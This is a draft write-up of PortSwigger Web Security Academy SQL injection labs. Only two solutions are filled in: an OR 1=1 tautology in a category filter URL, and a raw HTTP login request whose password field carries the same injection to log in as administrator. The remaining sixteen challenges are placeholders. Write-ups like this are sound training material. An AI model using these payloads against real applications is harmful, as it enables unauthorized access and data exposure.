---
title: "PSWA: SQL Injection"
date: 2026-06-22 # YYYY-MM-DD
lastMod: 2026-06-24
summary: "Solutions for Portswigger's SQL Injection academy module."
draft: true
series: ["Portswigger Web Academy"]
categories: ["PSWA", "hacking"]
tags: ["appsec", "pswa", "websec", "hacking"]
---

## Introduction

Placeholder.

## Challenge 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
> [!QUOTE]+ Problem Prompt
> This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
> SELECT * FROM products WHERE category = 'Gifts' AND released = 1
> 
> To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products. 
{icon="circle-question"}

clicking a category causes this url: `https://0a020007047c11fc81e9079c00ae0090.web-security-academy.net/filter?category=Gifts`

Just need to do a filter bypass using a true condition

Solution: https://0a020007047c11fc81e9079c00ae0090.web-security-academy.net/filter?category=Gifts'+OR+1=1--

## Challenge 2: SQL injection vulnerability allowing login bypass

> [!QUOTE]+ Problem Prompt
> This lab contains a SQL injection vulnerability in the login function.
> 
> To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.
{icon="circle-question"}

valid login:
```
POST /login HTTP/2
Host: 0a2b00c0032946a4821d42a0003b00ea.web-security-academy.net
Cookie: session=6kYmdZxjNKe47lWXJAQYQwa4SwlDiLd5
Content-Length: 84
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36

csrf=m3ASak9gnDBNw5DPJMo9DNt3YvksaI7q&username=administrator&password=test'+or+1=1--
```

adding to cookies causes the lab to successfully complete

## Challenge 3: SQL injection attack, querying the database type and version on Oracle

Placeholder.

## Challenge 4: SQL injection attack, querying the database type and version on MySQL and Microsoft

Placeholder.

## Challenge 5: SQL injection attack, listing the database contents on non-Oracle databases

Placeholder.

## Challenge 6: SQL injection attack, listing the database contents on Oracle

Placeholder.

## Challenge 7: SQL injection UNION attack, determining the number of columns returned by the query

Placeholder.

## Challenge 8: SQL injection UNION attack, finding a column containing text

Placeholder.

## Challenge 9: SQL injection UNION attack, retrieving data from other tables

Placeholder.

## Challenge 10: SQL injection UNION attack, retrieving multiple values in a single column

Placeholder.

## Challenge 11: Blind SQL injection with conditional responses

Placeholder.

## Challenge 12: Blind SQL injection with conditional errors

Placeholder.

## Challenge 13: Visible error-based SQL injection

Placeholder.

## Challenge 14: Blind SQL injection with time delays

Placeholder.

## Challenge 15: Blind SQL injection with time delays and information retrieval

Placeholder.

## Challenge 16: Blind SQL injection with out-of-band interaction

Placeholder.

## Challenge 17: Blind SQL injection with out-of-band data exfiltration

Placeholder.

## Challenge 18: SQL injection with filter bypass via XML encoding

Placeholder.